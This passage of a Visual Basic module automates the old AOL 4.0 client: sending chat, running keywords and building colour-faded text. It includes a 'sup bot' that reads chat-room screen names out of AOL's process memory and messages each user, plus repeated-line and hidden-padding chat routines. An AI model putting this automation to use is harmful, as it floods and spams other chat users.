Loop Until msg1% = 0
End Function

Sub AOLRunMenuByString(stringer As String)
Call RunMenuByString(stringer)
End Sub

Sub AOLSendChat(Chat)
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
Call SetFocusApi(Room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusApi(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub

Public Function AOLSupRoom()
'used for a sup bot
If IsUserOnline = 0 Then GoTo last
FindChatRoom
If FindChatRoom = 0 Then GoTo last

On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

Room = FindChatRoom()
aolhandle = FindChildByClass(Room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call SendChat("HeY! " & Person$ & " WaZ uP?")
TimeOut (0.5)
Next Index
Call CloseHandle(AOLProcessThread)
End If
last:
End Function

Function AOLVersion()
'if AOLversion = 4 then msgbox "You are using AOL 4.o" else "This is for AOL 4.o ONLY...please install it now!"
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
Glyph% = FindChildByClass(AOTool2%, "_AOL_Glyph")
If Glyph% <> 0 Then AOLVersion = 4
AOL% = FindWindow("AOL Frame25", 0&)
Wel% = Findchildbytitle(AOL%, "Welcome, " + UserSN())
aol3% = FindChildByClass(Wel%, "RICHCNTL")
If aol3% = 0 Then AOLVersion = 25: Exit Function
If aol3% <> 0 Then
If GetCaption(AOL%) <> "America Online" Then AOLVersion = 3
End If
End Function

Function AOLWin()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLWindow = AOL%
End Function

Function AOLWindow()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLWindow = AOL%
End Function







Function Arrows(times)
Randomize
FF = Int(Rnd * 3) + 1
If FF = 1 Then
For ii = 1 To times
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">å")
TimeOut 0.2
Call AOLChatsend("<font face=""Wingdings"" color=""#000000"">â")
TimeOut 0.2
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">æ")
TimeOut 0.2
Call AOLChatsend("  <font face=""Wingdings"" color=""#000000"">â")
TimeOut 1.5
Next ii
End If

If FF = 2 Then
For ii = 1 To times
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">í")
TimeOut 0.2
Call AOLChatsend("<font face=""Wingdings"" color=""#000000"">ê")
TimeOut 0.2
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">î")
TimeOut 0.2
Call AOLChatsend("  <font face=""Wingdings"" color=""#000000"">ê")
TimeOut 1.5
Next ii
End If

If FF = 3 Then
For ii = 1 To times
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">÷")
TimeOut 0.2
Call AOLChatsend("<font face=""Wingdings"" color=""#000000"">ò")
TimeOut 0.2
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">ø")
TimeOut 0.2
Call AOLChatsend("  <font face=""Wingdings"" color=""#000000"">ò")
TimeOut 1.5
Next ii
End If
End Function




Sub Attention(TheText As String)

BoldSendChat ("/\/\_- ATTENTION -_/\/\")
Call TimeOut(0.15)
BoldSendChat (TheText)
Call TimeOut(0.15)
BoldSendChat ("/\/\_- ATTENTION -_/\/\")
Call TimeOut(0.15)
'BoldSendChat ("<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & "‹›·´¯`·._.·• " & G$ & "v¹·¹" & L$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • " & aa$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • ")
End Sub


Sub BlankChat(txt)
Call AOLChatsend1("<font color=#fffeff> @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<font color=#0000ff> " & txt)
End Sub


Sub FadeFormBlue(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormGreen(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub
Sub FadeFormRed(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub


Sub KeyWord(txt)
    AOL% = FindWindow("AOL Frame25", vbNullString)
    temp% = FindChildByClass(AOL%, "AOL Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Combobox")
    KWBox% = FindChildByClass(temp%, "Edit")
    Call SendMessageByString(KWBox%, WM_SETTEXT, 0, txt)
    Call SendMessageByNum(KWBox%, WM_CHAR, VK_SPACE, 0)
    Call SendMessageByNum(KWBox%, WM_CHAR, VK_RETURN, 0)
End Sub

Function BoldBlackBlue(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (msg)

End Function


Function BoldBlackBlueBlack(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (msg)
End Function
Function BoldBlackBlueBlack2(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<B><U><Font Color=#" & H & ">" & D
    Next B
   SendChat (msg)
End Function
Function BoldBlackGreen(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function
Function BoldBlackGreenBlack(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (msg)
End Function


Function BoldBlackGrey(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 220 / a
        F = e * B
        G = RGB(F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (msg)
End Function

Function BoldBlackGreyBlack(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (msg)
End Function

Function BoldBlackPurple(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (msg)
End Function

Function BoldBlackRed(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function

Function BoldBlackRedBlack(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function
Function BoldBlackYellow(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function

Function BoldBlackYellowBlack(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (msg)
End Function

Function BoldBlueBlack(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function

Function BoldBlueBlackBlue(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function

Function BoldBlueGreen(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (msg)
End Function

Function BoldBlueGreenBlue(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function

Function BoldBluePurple(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function
Function BoldBlueRed(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (msg)
End Function
Function BoldBlueRedBlue(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (msg)
End Function

Function BoldBlueYellow(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function
Function BoldBlueYellowBlue(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, F, F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function




Function BoldDBlue_Black_DBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 450 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (msg)
End Function

Sub BoldFadeBlack(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000000>" & ab$ & "<FONT COLOR=#111111>" & u$ & "<FONT COLOR=#222222>" & S$ & "<FONT COLOR=#333333>" & T$ & "<FONT COLOR=#444444>" & Y$ & "<FONT COLOR=#555555>" & l$ & "<FONT COLOR=#666666>" & F$ & "<FONT COLOR=#777777>" & B$ & "<FONT COLOR=#888888>" & c$ & "<FONT COLOR=#999999>" & D$ & "<FONT COLOR=#888888>" & H$ & "<FONT COLOR=#777777>" & j$ & "<FONT COLOR=#666666>" & K$ & "<FONT COLOR=#555555>" & M$ & "<FONT COLOR=#444444>" & n$ & "<FONT COLOR=#333333>" & Q$ & "<FONT COLOR=#222222>" & V$ & "<FONT COLOR=#111111>" & z$
Next W
SendChat (PC$)
End Sub
Sub BoldFadeBlue(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000019>" & ab$ & "<FONT COLOR=#000026>" & u$ & "<FONT COLOR=#00003F>" & S$ & "<FONT COLOR=#000058>" & T$ & "<FONT COLOR=#000072>" & Y$ & "<FONT COLOR=#00008B>" & l$ & "<FONT COLOR=#0000A5>" & F$ & "<FONT COLOR=#0000BE>" & B$ & "<FONT COLOR=#0000D7>" & c$ & "<FONT COLOR=#0000F1>" & D$ & "<FONT COLOR=#0000D7>" & H$ & "<FONT COLOR=#0000BE>" & j$ & "<FONT COLOR=#0000A5>" & K$ & "<FONT COLOR=#00008B>" & M$ & "<FONT COLOR=#000072>" & n$ & "<FONT COLOR=#000058>" & Q$ & "<FONT COLOR=#00003F>" & V$ & "<FONT COLOR=#000026>" & z$
Next W
SendChat (PC$)

End Sub

Sub BoldFadeGreen(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#001100>" & ab$ & "<FONT COLOR=#002200>" & u$ & "<FONT COLOR=#003300>" & S$ & "<FONT COLOR=#004400>" & T$ & "<FONT COLOR=#005500>" & Y$ & "<FONT COLOR=#006600>" & l$ & "<FONT COLOR=#007700>" & F$ & "<FONT COLOR=#008800>" & B$ & "<FONT COLOR=#009900>" & c$ & "<FONT COLOR=#00FF00>" & D$ & "<FONT COLOR=#009900>" & H$ & "<FONT COLOR=#008800>" & j$ & "<FONT COLOR=#007700>" & K$ & "<FONT COLOR=#006600>" & M$ & "<FONT COLOR=#005500>" & n$ & "<FONT COLOR=#004400>" & Q$ & "<FONT COLOR=#003300>" & V$ & "<FONT COLOR=#002200>" & z$
Next W
SendChat (PC$)
End Sub

Sub BoldFadeRed(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FF0000>" & ab$ & "<FONT COLOR=#990000>" & u$ & "<FONT COLOR=#880000>" & S$ & "<FONT COLOR=#770000>" & T$ & "<FONT COLOR=#660000>" & Y$ & "<FONT COLOR=#550000>" & l$ & "<FONT COLOR=#440000>" & F$ & "<FONT COLOR=#330000>" & B$ & "<FONT COLOR=#220000>" & c$ & "<FONT COLOR=#110000>" & D$ & "<FONT COLOR=#220000>" & H$ & "<FONT COLOR=#330000>" & j$ & "<FONT COLOR=#440000>" & K$ & "<FONT COLOR=#550000>" & M$ & "<FONT COLOR=#660000>" & n$ & "<FONT COLOR=#770000>" & Q$ & "<FONT COLOR=#880000>" & V$ & "<FONT COLOR=#990000>" & z$
Next W
SendChat (PC$)


End Sub
Sub BoldFadeYellow(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FFFF00>" & ab$ & "<FONT COLOR=#999900>" & u$ & "<FONT COLOR=#888800>" & S$ & "<FONT COLOR=#777700>" & T$ & "<FONT COLOR=#666600>" & Y$ & "<FONT COLOR=#555500>" & l$ & "<FONT COLOR=#444400>" & F$ & "<FONT COLOR=#333300>" & B$ & "<FONT COLOR=#222200>" & c$ & "<FONT COLOR=#111100>" & D$ & "<FONT COLOR=#222200>" & H$ & "<FONT COLOR=#333300>" & j$ & "<FONT COLOR=#444400>" & K$ & "<FONT COLOR=#555500>" & M$ & "<FONT COLOR=#666600>" & n$ & "<FONT COLOR=#777700>" & Q$ & "<FONT COLOR=#888800>" & V$ & "<FONT COLOR=#999900>" & z$
Next W
SendChat (PC$)

End Sub

Function BoldGreenBlack(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (msg)
End Function


Function BoldGreenBlackGreen(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
  SendChat (msg)
End Function


Function BoldGreenBlue(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (msg)
End Function

Function BoldGreenBlueGreen(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, 0)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (msg)
End Function
Function BoldGreenPurple(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (msg)
End Function

Function BoldGreenPurpleGreen(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
  SendChat (msg)
End Function


Function BoldGreenRed(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (msg)
End Function

Function BoldGreenRedGreen(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, F)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (msg)
End Function



Function BoldGreenYellow(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 255, F)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
  SendChat (msg)
End Function


Function BoldGreenYellowGreen(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255, F)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
  SendChat (msg)
End Function
Function BoldGreyBlack(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 220 / a
        F = e * B
        G = RGB(255 - F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (msg)
End Function
Function BoldGreyBlackGrey(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function

Function BoldGreyBlue(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function
Function BoldGreyBlueGrey(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (msg)
End Function

Function BoldGreyGreen(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (msg)
End Function


Function BoldGreyGreenGrey(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function


Function BoldGreyPurple(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (msg)
End Function


Function BoldGreyPurpleGrey(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function

Function BoldGreyRed(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function
Function BoldGreyRedGrey(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function

Function BoldGreyYellow(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 255, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function


Function BoldGreyYellowGrey(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
